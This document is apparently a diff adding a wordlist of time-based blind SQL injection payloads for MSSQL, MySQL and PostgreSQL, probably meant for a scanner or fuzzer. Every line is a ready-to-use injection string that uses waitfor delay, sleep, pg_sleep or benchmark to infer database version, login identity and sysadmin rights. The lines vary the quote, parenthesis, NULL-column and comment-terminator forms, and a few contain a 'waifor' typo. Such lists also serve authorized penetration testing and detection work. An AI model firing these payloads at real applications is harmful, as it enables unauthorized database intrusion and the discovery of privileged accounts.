@@ -1,0 +1,283 @@
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__' 
+'); if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+'); if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+'); if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+'); if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+'); if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+'); if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__' 
+"; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+"; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+"; if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+"; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+"; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+"; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__' 
+"); if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:__TIME__' --
+"); if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:__TIME__' --
+"); if not(select system_user) <> 'sa' waitfor delay '0:0:__TIME__' --
+"); if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
+"); if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:__TIME__' --
+"); if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:__TIME__'
+sleep(__TIME__)#
+1 or sleep(__TIME__)#
+" or sleep(__TIME__)#
+' or sleep(__TIME__)#
+" or sleep(__TIME__)="
+' or sleep(__TIME__)='
+1) or sleep(__TIME__)#
+") or sleep(__TIME__)="
+') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#
+")) or sleep(__TIME__)="
+')) or sleep(__TIME__)='
+;waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+'));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(__TIME__)--
+1 or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+' or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+') or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+')) or pg_sleep(__TIME__)--
+ waitfor delay '0:0:__TIME__' /* 
+ waitfor delay '0:0:__TIME__' --
+' waitfor delay '0:0:__TIME__' /* 
+' waitfor delay '0:0:__TIME__' --
+" waitfor delay '0:0:__TIME__' /* 
+" waitfor delay '0:0:__TIME__' --
+) waitfor delay '0:0:__TIME__' /* 
+) waitfor delay '0:0:__TIME__' --
+)) waitfor delay '0:0:__TIME__' /* 
+)) waitfor delay '0:0:__TIME__' --
+))) waitfor delay '0:0:__TIME__' /* 
+))) waitfor delay '0:0:__TIME__' --
+)))) waitfor delay '0:0:__TIME__' /* 
+)))) waitfor delay '0:0:__TIME__' --
+))))) waitfor delay '0:0:__TIME__' --
+)))))) waitfor delay '0:0:__TIME__' --
+') waitfor delay '0:0:__TIME__' /* 
+') waitfor delay '0:0:__TIME__' --
+") waitfor delay '0:0:__TIME__' /* 
+") waitfor delay '0:0:__TIME__' --
+')) waitfor delay '0:0:__TIME__' /* 
+')) waitfor delay '0:0:__TIME__' --
+")) waitfor delay '0:0:__TIME__' /* 
+")) waitfor delay '0:0:__TIME__' --
+'))) waitfor delay '0:0:__TIME__' /* 
+'))) waitfor delay '0:0:__TIME__' --
+"))) waitfor delay '0:0:__TIME__' /* 
+"))) waitfor delay '0:0:__TIME__' --
+')))) waitfor delay '0:0:__TIME__' /* 
+')))) waitfor delay '0:0:__TIME__' --
+")))) waitfor delay '0:0:__TIME__' /* 
+")))) waitfor delay '0:0:__TIME__' --
+'))))) waitfor delay '0:0:__TIME__' /* 
+'))))) waitfor delay '0:0:__TIME__' --
+"))))) waitfor delay '0:0:__TIME__' /* 
+"))))) waitfor delay '0:0:__TIME__' --
+')))))) waitfor delay '0:0:__TIME__' /* 
+')))))) waitfor delay '0:0:__TIME__' --
+")))))) waitfor delay '0:0:__TIME__' /* 
+")))))) waitfor delay '0:0:__TIME__' --
+) waitfor delay '0:0:__TIME__' /*
+) waitfor delay '0:0:__TIME__' --
+') waitfor delay '0:0:__TIME__' /*
+') waitfor delay '0:0:__TIME__' --
+") waitfor delay '0:0:__TIME__' /*
+") waitfor delay '0:0:__TIME__' --
+)) waitfor delay '0:0:__TIME__' /*
+)) waitfor delay '0:0:__TIME__' --
+')) waitfor delay '0:0:__TIME__' /*
+')) waitfor delay '0:0:__TIME__' --
+")) waitfor delay '0:0:__TIME__' /*
+")) waitfor delay '0:0:__TIME__' --
+,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL) waitfor delay '0:0:__TIME__' --
+',NULL) waifor delay '0:0:__TIME__' /*
+',NULL) waitfor delay '0:0:__TIME__' --
+",NULL) waitfor delay '0:0:__TIME__' /*
+",NULL) waitfor delay '0:0:__TIME__' --
+),NULL) waitfor delay '0:0:__TIME__' /*
+),NULL) waitfor delay '0:0:__TIME__' --
+'),NULL) waifor delay '0:0:__TIME__' /*
+'),NULL) waitfor delay '0:0:__TIME__' --
+"),NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' /*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:__TIME__' --
+,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+",(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+"),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
+ and 0=benchmark(3000000,MD5(1)) /*
+ and 0=benchmark(3000000,MD5(1)) --
+ and 0=benchmark(3000000,MD5(1)) #
+' and 0=benchmark(3000000,MD5(1)) /*
+' and 0=benchmark(3000000,MD5(1)) --
+' and 0=benchmark(3000000,MD5(1)) #
+" and 0=benchmark(3000000,MD5(1)) /*
+" and 0=benchmark(3000000,MD5(1)) --
+" and 0=benchmark(3000000,MD5(1)) #
+) and 0=benchmark(3000000,MD5(1)) /*
+) and 0=benchmark(3000000,MD5(1)) --
+) and 0=benchmark(3000000,MD5(1)) #
+)) and 0=benchmark(3000000,MD5(1)) /*
+)) and 0=benchmark(3000000,MD5(1)) --
+)) and 0=benchmark(3000000,MD5(1)) #
+))) and 0=benchmark(3000000,MD5(1)) /*
+))) and 0=benchmark(3000000,MD5(1)) --
+))) and 0=benchmark(3000000,MD5(1)) #
+)))) and 0=benchmark(3000000,MD5(1)) /*
+)))) and 0=benchmark(3000000,MD5(1)) --
+)))) and 0=benchmark(3000000,MD5(1)) #
+') and 0=benchmark(3000000,MD5(1)) /*
+') and 0=benchmark(3000000,MD5(1)) --
+') and 0=benchmark(3000000,MD5(1)) #
+") and 0=benchmark(3000000,MD5(1)) /*
+") and 0=benchmark(3000000,MD5(1)) --
+") and 0=benchmark(3000000,MD5(1)) #
+')) and 0=benchmark(3000000,MD5(1)) /*
+')) and 0=benchmark(3000000,MD5(1)) --
+')) and 0=benchmark(3000000,MD5(1)) #
+")) and 0=benchmark(3000000,MD5(1)) /*
+")) and 0=benchmark(3000000,MD5(1)) --
+")) and 0=benchmark(3000000,MD5(1)) #
+'))) and 0=benchmark(3000000,MD5(1)) /*
+'))) and 0=benchmark(3000000,MD5(1)) --
+'))) and 0=benchmark(3000000,MD5(1)) #
+"))) and 0=benchmark(3000000,MD5(1)) /*
+"))) and 0=benchmark(3000000,MD5(1)) --
+"))) and 0=benchmark(3000000,MD5(1)) #
+')))) and 0=benchmark(3000000,MD5(1)) /*
+')))) and 0=benchmark(3000000,MD5(1)) --
+')))) and 0=benchmark(3000000,MD5(1)) #
+")))) and 0=benchmark(3000000,MD5(1)) /*
+")))) and 0=benchmark(3000000,MD5(1)) --
+")))) and 0=benchmark(3000000,MD5(1)) #
